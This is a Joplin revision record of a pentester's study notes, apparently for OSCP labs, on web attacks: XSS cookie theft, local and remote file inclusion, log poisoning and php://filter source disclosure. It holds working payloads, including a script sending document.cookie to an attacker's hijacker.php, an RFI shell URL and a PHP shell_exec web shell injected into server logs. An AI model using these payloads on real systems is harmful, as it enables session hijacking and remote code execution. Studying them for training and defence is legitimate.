id: a456ac625613487c938b4797b55063dc
parent_id: 
item_type: 1
item_id: 78f0d945ef914f6c8342ed9db47e13fa
item_updated_time: 1643161023660
title_diff: "[{\"diffs\":[[1,\"Website Exploit\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":15}]"
body_diff: "[{\"diffs\":[[1,\"# XSS\\\n\\\n## Reverse Shell\\\n\\\n## Using Beef\\\n\\\nBeef\\\n\\\n\\\\*\\\\*Note: \\\\*\\\\*XSS only works if an authenticated user accesses the webpage\\\n\\\n# Steal Cookie Session\\\n\\\nCookies have two optional flags of interest to pentesters: Secure and HttpOnly\\\n\\\n<ins>**Secure flag**</ins> \\\\-\\\\-\\\\- instructs browser to only send the cookie over encrypted connections. This protects cookie from being sent in cleartext and captured over the network\\\n\\\n- Make sure the website is not using HTTPS\\\n\\\n<ins>**HttpOnly**</ins> \\\\-\\\\-\\\\- instructs browser to deny JS access to the cookie. If the flag is not set, we can use an XSS payload to steal the cookie.\\\n\\\n- If HTTPOnly is set, we can try to use cookie jar overflow\\\n- ![b7757caf5e1a534ff942c14219c18e0f.png](:/d74f9f4349a046bbb52b0e421c07954d)\\\n- In Firefox console, the cookie did not overflow and got removed; instead we manually deleted the cookie and allowed the browser to overwrite. We can also manually edit the cookie; however, this will not work unless we programme it to\\\n- We can do a for-loop, then\\\n\\\nFirst, use an XSS script if HttpOnly is not set\\\n\\\n> &lt;script&gt;new Image().src=’[http://10.11.0.4/hijacker.php?cookie=’+document.cookie;](http://10.11.0.4/hijacker.php?cookie=%E2%80%99+document.cookie;)&lt;/script&gt;\\\n\\\nWhen we have our web server open, we will see the user accessing, and the Session ID generated\\\n\\\nUse Cookie-Editor to access the webpage\\\n\\\n# File Inclusion Vulnerabilities\\\n\\\nCheck values of register\\\\_globals, allow\\\\_url wrappers.\\\n\\\n- In [version](https://www.plus2net.com/php_tutorial/php-version.php) PHP 5 and above by default, *register_global* is kept OFF.\\\n- If allow\\\\_url\\\\_include or allow\\\\_url\\\\_fopen is enabled, proceed to do RFI\\\n\\\nIf have access to source code, check for **include** and code that are poorly design e.g.\\\n\\\n- $file = $_GET\\\\['page'\\\\];\\\n\\\nMake sure to look out for parameters that are linked to files (signs of file inclusion)\\\n\\\n![28d96990055803bbc316ed7557f0ea00.png](:/a43d4d1f5d3b4e1a9802a632d5ca66e3)\\\n\\\n> 192.168.0.2/DVWA/vulnerabilities/fi/?page=http://192.168.0.5:8000/shell.php #For RFI\\\n\\\nSometimes, the LFI is in the Request sent. Example shown is from OSCP machine we did\\\n\\\n<img src=\\\":/9c71d821603843889d4313b4d820bcb2\\\" alt=\\\"1e1c6c65502bd520d973599be7b3ac72.png\\\" width=\\\"851\\\" height=\\\"514\\\" class=\\\"jop-noMdConv\\\">\\\n\\\nSometimes during a Local File Inclusion, the web server appends ‘.php’ to the included file. For example, including ‘/etc/passwd’ gets rendered as ‘/etc/passwd.php’. This occurs when the include function uses a parameter like *?page* and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (%00) would cause the interpreter to stop reading, which would allow the attacker to include their intended page.\\\n\\\n# Log File Poisoning\\\n\\\nLogs to look into trying - https://www.thegeekstuff.com/2011/08/linux-var-log-files/\\\n\\\nFTP - /var/log/**vsftp.d**\\\n\\\nSSH, login info - /var/log/**auth.log**\\\n\\\nHTTP - On windows if xampp, C:\\\\\\\\xampp\\\\\\\\apache\\\\\\\\logs\\\\\\\\access.log; On Linux, /var/log/apache2/access.log\\\n\\\n> nc 192.168.1.102 80\\\n> \\\n> &lt;?php echo 'pre&gt;' . shell\\\\_exec($\\\\_GET\\\\['cmd'\\\\]) . '&lt;/pre&gt;';?>\\\n> \\\n> \\\\# To access log\\\n\\\nAfter writing to the log file, run the file\\\n\\\n> http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id\\\n\\\n# Bypassing php-execution\\\n\\\nSo if you have an LFI you can easily read `.txt`-files but not `.php` files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.\\\n\\\n> http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index\\\n\\\nHere you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:\\\n\\\n> base64 -d savefile.php\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":3825}]"
metadata_diff: {"new":{"id":"78f0d945ef914f6c8342ed9db47e13fa","parent_id":"8e7bd5349cf3494986eccd0619b576c9","latitude":"0.00000000","longitude":"0.00000000","altitude":"0.0000","author":"","source_url":"","is_todo":0,"todo_due":0,"todo_completed":0,"source":"joplin-desktop","source_application":"net.cozic.joplin-desktop","application_data":"","order":1643160994571,"markup_language":1,"is_shared":0,"share_id":"","conflict_original_id":"","master_key_id":""},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-01-26T01:44:55.950Z
created_time: 2022-01-26T01:44:55.950Z
type_: 13